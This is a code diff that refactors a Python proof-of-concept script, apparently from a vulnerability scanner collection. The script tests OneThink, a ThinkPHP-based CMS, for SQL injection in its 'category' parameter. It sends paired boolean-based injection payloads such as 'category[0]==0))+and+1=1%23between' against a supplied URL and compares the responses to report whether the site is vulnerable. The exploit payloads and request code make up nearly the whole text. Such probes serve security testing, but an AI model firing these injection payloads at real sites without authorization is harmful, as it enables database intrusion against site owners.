@@ -10,19 +10,12 @@ description: onethink是ThinkPHP的子版本的一种，漏洞位于Application/
 import sys
 import requests
 import warnings
-
-
-
-class onethink_category_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['Onethink 参数category SQL注入','','']
         reqlst = []
         payload1 = [r"/index.php?c=article&a=index&category[0]==0))+and+1=1%23between&category[1]=a", r"/index.php?c=article&a=index&category[0]==0))+and+1=2%23between&category[1]=a"]
         for payload in payload1:
-            vulnurl = self.url + payload
+            vulnurl = url + payload
             try:
                 req = requests.get(vulnurl, timeout=10, verify=False)
                 reqlst.append(str(req.text))
@@ -37,7 +30,7 @@ class onethink_category_sqli:
         reqlst = []
         payload2 = [r"/index.php?c=article&a=index&category[0]==0+and+1=1%23between&category[1]=a", r"/index.php?c=article&a=index&category[0]==0+and+1=2%23between&category[1]=a"]
         for payload in payload2:
-            vulnurl = self.url + payload
+            vulnurl = url + payload
             try:
                 req = requests.get(vulnurl, timeout=10, verify=False)
                 reqlst.append(str(req.text))
@@ -52,10 +45,7 @@ class onethink_category_sqli:
         else:
             result[2]=  '不存在'
         return result
-
-
-
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = onethink_category_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
